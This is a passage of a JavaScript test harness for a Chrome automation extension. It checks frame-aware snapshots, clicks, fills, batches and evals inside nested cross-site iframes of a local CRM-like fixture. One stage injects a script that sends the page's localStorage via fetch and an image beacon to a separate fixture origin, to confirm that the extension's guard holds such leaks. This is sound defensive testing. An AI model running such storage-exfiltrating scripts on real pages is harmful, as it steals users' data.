// @ts-check
// frames-suite (standalone harness): the proof that Vyre for Chrome works on the app the way GoHighLevel really renders it.
// GoHighLevel's Workflows UI (list and builder) is an IFRAME on another site than the shell, and its network traffic belongs to that
// frame. The fixture (bench/fixtures/ghl-shell.html, ghl-app.html, frames-world.mjs) is built the same way: a shell on a.localhost embeds
// the app on b.localhost, which stays blank until the shell posts it {type:"auth", token}, calls its own API with a bearer header and
// nests an email editor from c.localhost; a live-chat frame arrives 1.5 s after load, a ticker frame navigates, a same-origin frame sits
// in the nav and a sandboxed help panel cannot be read. Chrome treats the four hostnames as four sites (--site-per-process), so each is
// its own process. Everything goes through the MCP tools of the built release, on a real Chrome with the real extension.
//
//   node standalone/harness/frames-suite.mjs [--out file] [--chrome path] [--headless new|false]
//
// Stages (each names what it proves; a failure names the step that failed, the last result, and the capability that is missing):
//   a frames_listed          chrome_frames lists 3+ frames; all readable except the sandboxed one, which snapshot NAMES as not readable
//   b snapshot_iframe_app    chrome_snapshot shows the iframe app's controls with frame + origin, not only the shell nav
//   - app_needs_parent       the app opened as a top-level page shows only "Waiting for parent" (the handshake is real)
//   c act_fill_wait          click a control inside the iframe app, fill a field in the nested frame, wait for the late frame's control
//   d ghl_create_workflow    chrome_ghl run create-workflow end to end in the iframe builder; /__state has the workflow with 2 steps
//   e batch_across_frames    one chrome_batch spanning frames, one of which navigates mid-batch
//   f eval_in_frame          chrome_eval with `frame` reads the iframe's title; a leak of localStorage to a fresh origin is held, the frame's own API is not
//   g net_and_api            chrome_net list tags the iframe's /api/workflows requests; chrome_api learn/catalog/call work from that frame
//   h send_hold              a "Send Email" TILE in the builder drawer is not held; a real "Send" submit is held (and sent once when released)
//   i robust_flags           the same flow with a slow route, a "what's new" popup, an unsaved guard and a re-rendering toolbar, all in the frame
// Timings recorded: snapshot, click, fill, the create-workflow flow. Never run this on a person's machine.
//
// Chrome here is always launched through launchChrome (spike/harness/lib.mjs), which spreads CHROME_SAFE (lib/chrome-flags).
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { spawn, spawnSync } from "node:child_process";
import { hostManifest, launchChrome, parseArgs, prepareExtension, registerHost, resolveChrome, sleep, stats, stepSummary, stopProcess } from "../../spike/harness/lib.mjs";
import { startFixtureServer } from "../../bench/fixtures/server.mjs";
import { FRAMES_BATCH, FRAMES_SHELL_PATH, FRAMES_WORKFLOW } from "../../bench/scenarios.mjs";
import { build } from "../build-release.mjs";

const T0 = performance.now();
const log = (/** @type {string} */ m) => console.error(`[frames-suite +${Math.round(performance.now() - T0)}ms] ${m}`);
/** @template T @param {Promise<T>} p @param {number} ms @param {() => string} what @returns {Promise<T>} */
const within = (p, ms, what) => new Promise((res, rej) => { const t = setTimeout(() => rej(new Error(`${what()} took longer than ${ms} ms`)), ms); p.then(v => { clearTimeout(t); res(v); }, e => { clearTimeout(t); rej(e); }); });
const short = (/** @type {any} */ v, n = 500) => { try { return (typeof v === "string" ? v : JSON.stringify(v)).slice(0, n); } catch { return String(v).slice(0, n); } };
/** The value of a chrome_eval result, whichever way the tool spells it. @param {any} r */
const val = r => (r && typeof r === "object" && !Array.isArray(r) ? ("value" in r ? r.value : "result" in r ? r.result : r) : r);
/** A capability the run needs from the extension: false throws a message that names it. @param {any} cond @param {string} capability @param {string} detail */
const need = (cond, capability, detail) => { if (!cond) throw new Error(`MISSING CAPABILITY [${capability}]: ${detail}`); };

/** What a failed batch or flow says, short but complete about the step that failed. @param {any} r */
const brief = r => { try { const last = Array.isArray(r.results) ? r.results[r.results.length - 1] : undefined; return JSON.stringify({ ok: r.ok, done: r.done, failedAt: r.failedAt, code: r.code, why: r.why, failed: r.failed, stepFrames: r.stepFrames, last }).slice(0, 1500); } catch { return String(r).slice(0, 500); } };

/** A minimal MCP client over a child's stdio, with per-call logging and the last calls kept for a failure report. @param {import("node:child_process").ChildProcess} child */
function mcpClient(child) {
  let n = 0, calls = 0, buf = ""; const waiting = new Map();
  /** @type {Array<{ n: number, name: string, args: string, ms: number, error?: string, result: string }>} */ const recent = [];
  /** @type {any} */ const c = child;
  c.stdout.on("data", (/** @type {any} */ d) => { buf += d; let i; while ((i = buf.indexOf("\n")) >= 0) { const line = buf.slice(0, i); buf = buf.slice(i + 1); if (!line.trim()) continue; try { const m = JSON.parse(line); waiting.get(m.id)?.(m); } catch { /* not ours */ } } });
  const rpc = (/** @type {string} */ method, /** @type {any} */ params, ms = 60_000) => within(new Promise(res => { const id = ++n; waiting.set(id, res); c.stdin.write(JSON.stringify({ jsonrpc: "2.0", id, method, params }) + "\n"); }), ms, () => `mcp ${method}`);
  /** A tool call: the parsed JSON result, or throws with the tool's error text. */
  const call = async (/** @type {string} */ name, /** @type {any} */ args = {}, ms = 60_000) => {
    const k = ++calls, t = performance.now();
    log(`> #${k} ${name} ${short(args, 160)}`);
    const rec = { n: k, name, args: short(args, 200), ms: 0, result: "" };
    recent.push(rec); if (recent.length > 12) recent.shift();
    try {
      const r = /** @type {any} */ (await rpc("tools/call", { name, arguments: args }, ms));
      rec.ms = Math.round(performance.now() - t);
      if (r.error) { rec.error = `rpc ${r.error.code} ${r.error.message}`; throw new Error(`${name}: rpc ${r.error.code} ${r.error.message}`); }
      const text = (r.result.content.find((/** @type {any} */ x) => x.type === "text") || {}).text || "null";
      rec.result = short(text, 400);
      if (r.result.isError) { rec.error = short(text, 300); throw Object.assign(new Error(`${name}: ${text.slice(0, 500)}`), { text }); }
      log(`< #${k} ${name} ${rec.ms}ms`);
      try { return JSON.parse(text); } catch { return text; }
    } catch (e) { rec.ms = rec.ms || Math.round(performance.now() - t); rec.error = rec.error || String(/** @type {Error} */ (e).message).slice(0, 300); log(`! #${k} ${name} ${rec.ms}ms ${rec.error}`); throw e; }
  };
  return { rpc, call, recent };
}

async function main() {
  const args = parseArgs(process.argv.slice(2));
  // DNR alone (Fetch off in the product under the test flag and a temp profile): the same stage must still see zero requests at the server. The eval is then not reported held (the Fetch layer is what reports).
  const NOFETCH = process.env.VYRE_CHROME_TEST_NOFETCH === "1";
  const headless = args.headless === "false" ? false : typeof args.headless === "string" ? args.headless : "new";
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "vyre-fs-"));
  const udd = path.join(tmp, "profile"); fs.mkdirSync(udd);
  const data = path.join(tmp, "data");
  /** @type {Record<string, any>} */ const out = { tool: "chrome-frames-suite", os: `${process.platform}-${os.arch()}`, node: process.version, headless, stages: {}, timings: {}, at: new Date().toISOString() };
  const writeOut = () => { if (typeof args.out === "string") { try { fs.mkdirSync(path.dirname(path.resolve(args.out)), { recursive: true }); fs.writeFileSync(args.out, JSON.stringify(out, null, 2)); } catch { /* best effort */ } } };
  setTimeout(() => { out.fatal = out.fatal || "watchdog: still running after 660 s"; console.log(JSON.stringify(out, null, 2)); writeOut(); process.exit(3); }, 660_000).unref();
  /** @type {any} */ let chromeProc = null, fixture = null, mcp = null;
  const cleanups = /** @type {Array<()=>void>} */ ([]);

  // ---- stages and steps: a failure names the stage, the step it was on, the last call and what it returned
  let curStage = "", curStep = "";
  /** Name the step being done; a failure reports it. @template T @param {string} label @param {() => Promise<T>} fn @returns {Promise<T>} */
  const step = async (label, fn) => { curStep = label; log(`  step: ${label}`); return fn(); };
  /** @param {string} name @param {() => Promise<any>} fn @param {number} [budgetMs] */
  const stage = async (name, fn, budgetMs = 90_000) => {
    const t = performance.now(); curStage = name; curStep = "start"; log(`stage ${name}`);
    try { out.stages[name] = { ok: true, ...(await within(fn(), budgetMs, () => `stage ${name} (at step "${curStep}")`)), ms: Math.round(performance.now() - t) }; log(`stage ${name} ok`); return true; }
    catch (e) {
      const last = mcp && mcp.recent[mcp.recent.length - 1];
      const m = `step "${curStep}": ${String(/** @type {Error} */ (e).message || e).slice(0, 700)}${last ? `; last call #${last.n} ${last.name} ${last.args} -> ${last.error ? "ERROR " + last.error : last.result.slice(0, 300)}` : ""}`;
      log(`stage ${name} FAILED: ${m.slice(0, 500)}`);
      out.stages[name] = { ok: false, error: m.slice(0, 1600), lastCalls: mcp ? mcp.recent.slice(-6) : [], ms: Math.round(performance.now() - t) };
      return false;
    }
  };
  /** Time n runs of a call. @param {number} n @param {()=>Promise<any>} fn */
  const timed = async (n, fn) => { const xs = []; for (let i = 0; i < n; i++) { const t = performance.now(); await fn(); xs.push(performance.now() - t); } return stats(xs); };
  const state = async () => /** @type {any} */ ((await (await fetch(`${fixture.url}/__state`)).json()).data);
  /** Poll a condition on the fixture's state (the page's request reaches the server a moment later). @param {(s:any)=>any} pick @param {(v:any)=>boolean} ok @param {string} what */
  const stateWhere = async (pick, ok, what) => { const end = Date.now() + 8000; let v; for (;;) { v = pick(await state()); if (ok(v)) return v; if (Date.now() > end) throw new Error(`the fixture never saw ${what}; last value ${short(v, 300)}`); await sleep(150); } };

  try {
    log("build the release");
    const rel = build({ out: path.join(tmp, "release") });
    out.release = { version: rel.version, sha256: rel.sha };
    const home = path.join(tmp, "home"); fs.mkdirSync(home);
    const env = { ...process.env, HOME: home, USERPROFILE: home, VYRE_CHROME_HOME: data, VYRE_CHROME_TEST: "1" };
    const cliInstall = path.join(rel.dir, "standalone", "cli.mjs");
    const app = path.join(data, "app");
    const cli = path.join(app, "standalone", "cli.mjs");
    log("cli install");
    const inst = spawnSync(process.execPath, [cliInstall, "install", "--browsers", "chrome", "--no-wait"], { env, encoding: "utf8" });
    out.install = { status: inst.status, stderr: (inst.stderr || "").slice(0, 300) };
    if (inst.status !== 0) throw new Error(`install failed: ${inst.stderr}`);
    const ext = prepareExtension(path.join(app, "extension"), path.join(tmp, "extension"));
    out.extensionId = ext.id;
    const launcher = path.join(app, "native-host", process.platform === "win32" ? "run-host.cmd" : "run-host.sh");
    cleanups.push(registerHost({ manifestObj: hostManifest({ wrapper: launcher, id: ext.id }), dir: tmp, userDataDir: udd }));

    fixture = await startFixtureServer();
    const shellUrl = `${fixture.site("shell")}${FRAMES_SHELL_PATH}`;
    out.fixture = { shell: shellUrl, app: fixture.site("app"), widgets: fixture.site("widgets"), fresh: fixture.site("fresh") };
    // What a person on a white-label GoHighLevel domain does once: list the shell and the app host as GoHighLevel's (a *.localhost name
    // is not GoHighLevel's own). This harness has no person to ask, so a held send may be released without a question.
    for (const h of ["a.localhost", "b.localhost"]) spawnSync(process.execPath, [cli, "config", "ghl-host", h], { env, encoding: "utf8" });
    spawnSync(process.execPath, [cli, "config", "confirm-sends", "off"], { env, encoding: "utf8" });
    const child = spawn(process.execPath, [cli, "mcp"], { env, stdio: ["pipe", "pipe", "pipe"] });
    mcp = mcpClient(child);
    child.stderr.on("data", d => { const s = String(d).trim(); if (s) log(`mcp: ${s.slice(0, 200)}`); });
    cleanups.push(() => { try { child.kill(); } catch { /* gone */ } });
    await stage("mcp_initialize", async () => { const r = /** @type {any} */ (await mcp.rpc("initialize", { protocolVersion: "2025-06-18", capabilities: {}, clientInfo: { name: "harness", version: "1" } })); const l = /** @type {any} */ (await mcp.rpc("tools/list", {})); const names = l.result.tools.map((/** @type {any} */ t) => t.name); need(["chrome_frames", "chrome_snapshot", "chrome_act", "chrome_fill", "chrome_wait", "chrome_eval", "chrome_batch", "chrome_net", "chrome_api", "chrome_ghl", "chrome_send"].every(n => names.includes(n)), "tools", `missing tools: ${["chrome_frames", "chrome_snapshot", "chrome_act", "chrome_fill", "chrome_wait", "chrome_eval", "chrome_batch", "chrome_net", "chrome_api", "chrome_ghl", "chrome_send"].filter(n => !names.includes(n)).join(", ")}`); return { server: r.result.serverInfo, tools: names.length }; });

    const chrome = resolveChrome({ chrome: typeof args.chrome === "string" ? args.chrome : undefined });
    out.chrome = chrome.version;
    // --site-per-process: each site (a, b, c, d .localhost) is its own process, as GoHighLevel's app is. A fixed window size so the layout is the same everywhere.
    const launched = launchChrome({ chrome: chrome.path, userDataDir: udd, url: "about:blank", extraArgs: [`--load-extension=${ext.dir}`, `--disable-extensions-except=${ext.dir}`, "--site-per-process", "--window-size=1280,900"], headless, logFile: path.join(tmp, "chrome.log") });
    chromeProc = launched.child; log("chrome launched");

    const connected = await stage("connected", async () => {
      const end = Date.now() + 45_000;
      for (;;) { const s = await mcp.call("chrome_status", {}); if (s.connected) return { extension: s.extension && { protocol: s.extension.protocol, version: s.extension.version } }; if (Date.now() > end) throw new Error("the extension never connected: " + short(s, 300)); await sleep(250); }
    });
    if (connected) {
      /** @type {any} */ let tab;
      const tabIdOf = (/** @type {any} */ r) => r.id ?? (r.tab && r.tab.id);
      /** Open the shell in the tab (fresh: the app reboots, the late frame is re-added, the ticker resets) and wait until the app has drawn. @param {string} [url] @param {{ noApp?: boolean }} [o] */
      const fresh = async (url = shellUrl, o = {}) => {
        await step("navigate the tab to the shell", () => mcp.call("chrome_tabs", { action: "navigate", tab, url }));
        if (!o.noApp) await step("wait for the app's Create Workflow control (inside the iframe)", async () => { const t = performance.now(); await mcp.call("chrome_wait", { tab, selector: { name: "Create Workflow", identifier: "create-workflow" }, timeoutMs: 20_000 }, 30_000); return Math.round(performance.now() - t); }).catch(async (/** @type {any} */ e) => { try { const nl = await mcp.call("chrome_net", { action: "list", tab, limit: 40 }); console.log("[frames-suite] FRESH FAILED sticky " + JSON.stringify(nl.sticky) + " recent " + JSON.stringify((nl.requests || []).slice(-12).map((/** @type {any} */ r) => `${r.method} ${String(r.url).replace(/^http:\/\//, "")} ${r.status ?? r.state ?? ""}`))); } catch { /* diag only */ } throw e; });
      };
      await stage("open_shell", async () => { const r = await mcp.call("chrome_tabs", { action: "use", url: shellUrl, openIfMissing: true }); tab = tabIdOf(r); need(tab !== undefined, "tabs.use", "no tab id came back: " + short(r, 200)); return { tab }; });

      // ---------------------------------------------------------------- (a) frames listed
      /** @type {any[]} */ let frameRows = [];
      await stage("frames_listed", async () => {
        const end = Date.now() + 25_000;
        for (;;) {
          const r = await step("chrome_frames list", () => mcp.call("chrome_frames", { action: "list", tab }));
          frameRows = Array.isArray(r) ? r : (r.frames || []);
          // Shell, app, nested editor, same-origin, sandboxed, ticker and (after 1.5 s) the late chat.
          if (frameRows.length >= 7 && frameRows.some(f => /\/late/.test(String(f.url || "")))) break;
          if (Date.now() > end) break;
          await sleep(400);
        }
        need(frameRows.length >= 3, "frames.list", `only ${frameRows.length} frame(s) listed, wanted the shell, the app and the nested editor at least: ${short(frameRows.map(f => ({ i: f.index, o: f.origin, u: f.url, r: f.readable })), 600)}`);
        need(frameRows.length >= 7, "frames.list", `${frameRows.length} frames listed, wanted 7 (shell, app, nested editor, same-origin, sandboxed, ticker, late chat): ${short(frameRows.map(f => f.url), 600)}`);
        need(frameRows.some(f => /\/email-editor/.test(String(f.url || "")) && f.depth >= 2), "frames.list", "the editor nested inside the app is not listed at depth 2 (nested frames are not walked)");
        need(frameRows.some(f => /\/late/.test(String(f.url || ""))), "frames.list", "the late frame (added 1.5 s after load) is not listed");
        // A sandboxed iframe (no allow-same-origin) has an opaque origin but Chrome's debugger can still run scripts in it, so it is READABLE
        // here; what matters is that it is listed, never silently left out. Anything that really is not readable must be named.
        const sandboxed = frameRows.find(f => /\/sandboxed/.test(String(f.url || "")));
        need(sandboxed, "frames.list", `the sandboxed frame is not listed at all: ${short(frameRows.map(f => f.url), 600)}`);
        const bad = frameRows.filter(f => f.readable === false);
        out.notes = { ...(out.notes || {}), sandboxedFrame: { origin: sandboxed.origin, readable: sandboxed.readable }, notReadable: bad.map(f => ({ index: f.index, origin: f.origin, why: f.why })) };
        const probe = await step("chrome_frames probe", () => mcp.call("chrome_frames", { action: "probe", tab }));
        const prow = Array.isArray(probe) ? probe : (probe.frames || []);
        need(prow.filter((/** @type {any} */ f) => f.readable !== false && f.title).length >= 5, "frames.probe", `probe read the title of fewer than 5 readable frames: ${short(prow.map((/** @type {any} */ f) => [f.index, f.readable, f.title]), 500)}`);
        const snap = await step("chrome_snapshot lists every frame, and names any that is not readable", () => mcp.call("chrome_snapshot", { tab }));
        need(Array.isArray(snap.frames) && snap.frames.length >= 7, "snapshot.frames", `the snapshot lists ${Array.isArray(snap.frames) ? snap.frames.length : "no"} frames, wanted 7`);
        if (bad.length) need(/frames? not readable/i.test(String(snap.text || "")), "snapshot.notReadable", `frames are not readable but the snapshot text does not say so: ${short(String(snap.text || "").slice(0, 300))}`);
        return { frames: frameRows.length, readable: frameRows.filter(f => f.readable !== false).length, notReadable: bad.map(f => f.origin || f.url), depths: frameRows.map(f => f.depth), snapshotSays: /(\d+ frames? not readable[^.]*)\./i.exec(String(snap.text || ""))?.[1] };
      });

      // ---------------------------------------------------------------- (b) snapshot shows the iframe app's controls
      await stage("snapshot_iframe_app", async () => {
        let snap = /** @type {any} */ (null);
        const end = Date.now() + 15_000;
        do { snap = await step("chrome_snapshot", () => mcp.call("chrome_snapshot", { tab })); if ((snap.controls || []).some((/** @type {any} */ c) => /create workflow/i.test(String(c.name || "")))) break; await sleep(300); } while (Date.now() < end);
        const frames = snap.frames || [];
        const originOf = (/** @type {any} */ c) => c.frameOrigin || (frames.find((/** @type {any} */ f) => f.index === c.frame) || {}).origin || "";
        const controls = /** @type {any[]} */ (snap.controls || []);
        const shellNav = controls.find(c => /^automation$/i.test(String(c.name || "")));
        need(shellNav && (shellNav.frame ?? 0) === 0, "snapshot", `the shell's left nav "Automation" is not listed in frame 0: ${short(shellNav)}`);
        const create = controls.find(c => /^create workflow$/i.test(String(c.name || "")));
        need(create, "snapshot.frames", `the iframe app's "Create Workflow" is not in the snapshot (${controls.length} controls, from frames ${short([...new Set(controls.map(c => c.frame ?? 0))])}); the snapshot reads only the top page`);
        need((create.frame ?? 0) > 0, "snapshot.frames", `"Create Workflow" is listed with frame ${create.frame ?? 0}: it carries no frame`);
        need(/^http:\/\/b\.localhost:\d+$/.test(originOf(create)), "snapshot.frames", `"Create Workflow" carries frame origin ${JSON.stringify(originOf(create))}, wanted the app's http://b.localhost:PORT`);
        const editor = controls.find(c => /email editor body/i.test(String(c.name || "")));
        need(editor && /^http:\/\/c\.localhost:\d+$/.test(originOf(editor)), "snapshot.frames", `the nested editor's field is not listed with the c.localhost origin: ${short(editor)}`);
        const byFrame = controls.reduce((/** @type {Record<string, number>} */ m, c) => { const k = originOf(c) || "top"; m[k] = (m[k] || 0) + 1; return m; }, {});
        out.timings.snapshot = await step("time chrome_snapshot", () => timed(5, () => mcp.call("chrome_snapshot", { tab })));
        return { controls: controls.length, byFrameOrigin: byFrame, createWorkflow: { frame: create.frame, origin: originOf(create), identifier: create.identifier }, latency: out.timings.snapshot };
      });

      // The app opened as a top-level page has no parent to hand it the token: it must show nothing but a waiting note.
      await stage("app_needs_parent", async () => {
        await step("open the app's own URL as a top-level page", () => mcp.call("chrome_tabs", { action: "navigate", tab, url: `${fixture.site("app")}/automation/workflows` }));
        await sleep(1500);
        const snap = await step("chrome_snapshot", () => mcp.call("chrome_snapshot", { tab }));
        need(/Waiting for parent/i.test(String(snap.text || "")), "fixture", `the app opened alone does not say it is waiting for its parent: ${short(String(snap.text || ""), 200)}`);
        need(!(snap.controls || []).some((/** @type {any} */ c) => /create workflow/i.test(String(c.name || ""))), "fixture", "the app drew its controls without the shell's auth message");
        return { text: String(snap.text || "").slice(0, 60), controls: (snap.controls || []).length };
      });

      // ---------------------------------------------------------------- (c) act inside the iframe, fill in the nested frame, wait for the late frame
      await stage("act_fill_wait", async () => {
        await fresh(shellUrl, { noApp: true });
        // The late frame is added 1.5 s after load: ask for its control right away and time how long the wait takes.
        const tLate = performance.now();
        const lateP = step("wait for the late frame's control (Open chat widget)", () => mcp.call("chrome_wait", { tab, selector: { name: "Open chat widget", identifier: "open-chat" }, timeoutMs: 20_000 }, 30_000));
        const late = await lateP; const lateMs = Math.round(performance.now() - tLate);
        need(late && late.ok !== false && late.found !== false, "wait.frames", `chrome_wait did not report the late frame's control: ${short(late)}`);
        await step("wait for the app to draw", () => mcp.call("chrome_wait", { tab, selector: { name: "Create Workflow", identifier: "create-workflow" }, timeoutMs: 20_000 }, 30_000));
        // Click inside the iframe app (its Create Workflow opens a chooser), then close the chooser with its own Cancel.
        const click = await step("click Create Workflow inside the iframe app", () => mcp.call("chrome_act", { tab, selector: { name: "Create Workflow", identifier: "create-workflow" }, kind: "click" }));
        need(click.ok !== false && !click.held, "act.frames", `the click inside the iframe app failed: ${short(click)}`);
        console.log("[frames-suite] ACT TIMING " + JSON.stringify({ trace: click.trace, point: click.point, ms: click.ms }).slice(0, 700));
        const tr = click.trace || {};
        need(typeof tr.frame === "number" ? tr.frame > 0 : true, "act.frames", `the click ran in frame ${tr.frame}, not in the app's frame`);
        const opened = await step("the chooser opened (read inside the iframe)", () => mcp.call("chrome_eval", { tab, frame: "b.localhost", expression: "!document.getElementById('chooser').classList.contains('hidden')" }));
        need(val(opened) === true, "act.frames", `the click on Create Workflow did not reach the app: chooser open is ${short(opened)}`);
        await step("click Cancel in the chooser", () => mcp.call("chrome_act", { tab, selector: { name: "Cancel", identifier: "chooser-cancel" }, kind: "click" }));
        // Fill a field inside the NESTED frame (site C, inside the app on site B) and press its Save.
        const fill = await step("fill the nested editor's field (frame two levels down)", () => mcp.call("chrome_fill", { tab, fields: [{ selector: { name: "Email editor body", identifier: "editor-body" }, value: "hello from kit" }] }));
        need(fill.ok !== false, "fill.frames", `the fill inside the nested frame failed: ${short(fill)}`);
        // Diagnostic: where does a click in the nested frame land, by the top session and by the frame's own?
        try { const ct = await step("clicktest the nested editor's Save (both routes)", () => mcp.call("chrome_frames", { action: "clicktest", tab, frame: "email-editor", css: "#editor-save" })); console.log("[frames-suite] NESTED CLICKTEST " + JSON.stringify(ct).slice(0, 900)); } catch (e) { console.log("[frames-suite] NESTED CLICKTEST failed: " + String(e && e.message || e).slice(0, 300)); }
        const save = await step("click Save design in the nested editor", () => mcp.call("chrome_act", { tab, selector: { name: "Save design", identifier: "editor-save" }, kind: "click" }));
        need(save.ok !== false && !save.held, "act.frames", `the Save click in the nested frame failed: ${short(save)}`);
        const saved = await step("the fixture saw the nested editor's text", () => stateWhere(s => s.editorSaves, v => v.length >= 1, "the nested editor's save"));
        need(saved[saved.length - 1].body === "hello from kit", "fill.frames", `the nested editor saved ${JSON.stringify(saved[saved.length - 1])}, wanted "hello from kit": the fill did not reach the nested frame`);
        // Time a click and a fill inside the iframe app.
        out.timings.click = await step("time clicks inside the iframe", () => timed(5, () => mcp.call("chrome_act", { tab, selector: { name: "Search workflows", identifier: "workflow-search" }, kind: "click" })));
        out.timings.fill = await step("time fills inside the iframe", () => timed(5, () => mcp.call("chrome_fill", { tab, fields: [{ selector: { name: "Search workflows", identifier: "workflow-search" }, value: "x" }] })));
        return { lateFrameWaitMs: lateMs, clickTrace: tr, editorSaved: saved[saved.length - 1], click: out.timings.click, fill: out.timings.fill };
      });

      // ---------------------------------------------------------------- (d) the create-workflow flow in the iframe builder
      await stage("ghl_create_workflow", async () => {
        await fresh();
        const before = (await state()).workflows.length;
        const t0 = performance.now();
        const run = await step("chrome_ghl run create-workflow", () => mcp.call("chrome_ghl", { action: "run", tab, flow: "create-workflow", params: FRAMES_WORKFLOW }, 90_000));
        const ms = Math.round(performance.now() - t0);
        need(run.ok !== false, "ghl.run.frames", `the flow failed: ${brief(run)}`);
        const last = Array.isArray(run.results) ? run.results[run.results.length - 1] : undefined;
        const st = await step("the fixture has the workflow", () => stateWhere(s => s.workflows, v => v.length > before, "the created workflow"));
        const wf = st[st.length - 1];
        need(wf.name === FRAMES_WORKFLOW.name, "ghl.run.frames", `the workflow is named ${JSON.stringify(wf.name)}, wanted ${JSON.stringify(FRAMES_WORKFLOW.name)}: ${short(wf)}`);
        need(wf.trigger === "Contact Created", "ghl.run.frames", `the trigger is ${JSON.stringify(wf.trigger)}, wanted "Contact Created"`);
        need(Array.isArray(wf.actions) && wf.actions.length === 2, "ghl.run.frames", `the workflow has ${wf.actions && wf.actions.length} steps, wanted 2: ${short(wf.actions)}`);
        need(wf.actions[0].type === "Send Email" && /Welcome to Harlow Legal/.test(short(wf.actions[0])) && wf.actions[1].type === "Add Tag" && /new-lead/.test(short(wf.actions[1])), "ghl.run.frames", `the steps do not carry the config that was given: ${short(wf.actions)}`);
        need(last && last.saved === true && last.evidence && last.evidence.kind === "toast", "ghl.save.frames", `the save was not verified by the toast: last step ${short(last)}`);
        const frames = (run.stepFrames || []).map((/** @type {any} */ x) => x.frame);
        need(frames.length && frames.some((/** @type {number} */ f) => f > 0), "ghl.run.frames", `no step of the flow reports running in a child frame (stepFrames ${short(run.stepFrames)})`);
        out.timings.createWorkflowFlow = { ms, perStepMs: run.perStepMs, steps: run.steps };
        return { ms, steps: run.steps, perStepMs: run.perStepMs, workflow: { id: wf.id, name: wf.name, trigger: wf.trigger, steps: wf.actions.length }, saveEvidence: last.evidence, stepFrames: run.stepFrames && run.stepFrames.length };
      }, 120_000);

      // ---------------------------------------------------------------- (e) a batch across frames, one of which navigates mid-batch
      await stage("batch_across_frames", async () => {
        await fresh();
        await step("wait for the ticker frame's first page", () => mcp.call("chrome_wait", { tab, selector: { name: "Ticker one ack", identifier: "ticker-ack-1" }, timeoutMs: 10_000 }, 20_000));
        const acks0 = (await state()).acks.length;
        const steps = FRAMES_BATCH.map(s => ({ ...s, args: { ...s.args, tabId: tab } }));
        const t0 = performance.now();
        const r = await step("chrome_batch across frames", () => mcp.call("chrome_batch", { tab, steps }, 60_000));
        const ms = Math.round(performance.now() - t0);
        need(r.ok !== false, "batch.frames", `the batch failed at a step: ${brief(r)}`);
        console.log("[frames-suite] BATCH STEPS " + JSON.stringify((r.results || []).map((/** @type {any} */ x) => ({ ok: x && x.ok, did: x && x.did, f: x && x.point && x.point.frame, own: x && x.point && x.point.ownSession, ms: x && x.ms, tf: x && x.trace && x.trace.frame, w: x && x.trace && x.trace.waitedMs, r: x && x.trace && x.trace.retries }))).slice(0, 1200));
        const acks = await step("the ticker frame's second page was pressed", () => stateWhere(s => s.acks, v => v.length > acks0, "the click in the navigated ticker frame"));
        need(acks[acks.length - 1] === 2, "batch.frames", `the ticker ack was for page ${acks[acks.length - 1]}, wanted 2: the batch acted on the old page`);
        try { const d = await mcp.call("chrome_eval", { tab, frame: "email-editor", expression: "JSON.stringify({ value: document.getElementById('editor-body').value, status: document.getElementById('editor-status').textContent, url: location.href })" }); console.log("[frames-suite] EDITOR AFTER BATCH " + JSON.stringify(d).slice(0, 400)); } catch (e) { console.log("[frames-suite] EDITOR AFTER BATCH eval failed: " + String(e && e.message || e).slice(0, 200)); }
        try { const fr = await mcp.call("chrome_frames", { action: "list", tab }); console.log("[frames-suite] FRAMES AFTER BATCH " + JSON.stringify((fr.frames || fr || []).map((/** @type {any} */ f) => ({ i: f.index, o: String(f.origin || "").slice(0, 28), u: String(f.url || "").replace(/^https?:\/\/[^/]+/, "").slice(0, 24), s: f.session ? "s" : f.how }))).slice(0, 700)); } catch { /* best effort */ }
        const saves = await stateWhere(s => s.editorSaves, v => v.some((/** @type {any} */ e) => e.body === "batch text for juno"), "the nested editor's text from the batch");
        const v = await mcp.call("chrome_eval", { tab, frame: "b.localhost", expression: "document.getElementById('workflow-search').value" });
        need(val(v) === "intake", "batch.frames", `the app's search box holds ${short(val(v))}, wanted "intake"`);
        const frames = (r.results || []).map((/** @type {any} */ x) => x && x.trace && x.trace.frame).filter((/** @type {any} */ f) => typeof f === "number");
        return { ms, steps: steps.length, frames, editorSaves: saves.length, acks };
      });

      // ---------------------------------------------------------------- (f) eval in the iframe; a leak is held, the frame's own API is not
      await stage("eval_in_frame", async () => {
        await fresh();
        const inTop = await step("eval in the top page", () => mcp.call("chrome_eval", { tab, expression: "document.title" }));
        const inApp = await step("eval in the iframe (frame: b.localhost)", () => mcp.call("chrome_eval", { tab, frame: "b.localhost", expression: "document.title" }));
        need(val(inTop) === "Harlow Legal CRM", "eval.top", `the top page's title is ${short(val(inTop))}`);
        need(val(inApp) === "Workflows | Harlow Legal", "eval.frame", `chrome_eval with frame b.localhost returned ${short(val(inApp))}, wanted the iframe's own title "Workflows | Harlow Legal" (it ran in the top page?)`);
        const leakTo = `${fixture.site("fresh")}/collect?d=`;
        const before = (await state()).collected.length;
        // The same script is run several times: the guard must hold it EVERY time, and the fresh origin must see nothing EVERY time (a leak on Windows was intermittent).
        let leak = /** @type {any} */ (null);
        for (let n = 0; n < 8; n++) {
          leak = await step("an eval inside the iframe sends localStorage to a fresh origin" + (n ? ` (again ${n})` : ""), () => mcp.call("chrome_eval", { tab, frame: "b.localhost", expression: `(async () => { localStorage.setItem('k', 'v'); try { await fetch(${JSON.stringify(leakTo)} + encodeURIComponent(JSON.stringify(localStorage))); } catch (e) {} new Image().src = ${JSON.stringify(leakTo)} + 'img'; return 1; })()` }));
          console.log("[frames-suite] EGRESS " + JSON.stringify({ n, held: leak.held, contained: leak.contained, why: String(leak.why || "").slice(0, 160), ...(leak.diag ? { paused: leak.diag.paused, probe: leak.diag.probe } : {}) }));
          need(NOFETCH || leak.held === true, "eval.frame.guard", `a script inside the iframe that sent storage to a fresh origin was not held (run ${n}): ${short(leak)} (the guard covers the top page only)`);
          await sleep(300);
          const got = (await state()).collected;
          if (got.length !== before) {
            // PROVE THE PATH: what reached the server, and what the tab's own network capture says about every request to that origin (session, frame, type, status).
            console.log("[frames-suite] LEAKED " + JSON.stringify({ n, held: leak.held, contained: leak.contained, collected: got.slice(before).map((/** @type {any} */ c) => JSON.stringify(c).slice(0, 200)), held_why: String(leak.why || "").slice(0, 300) }));
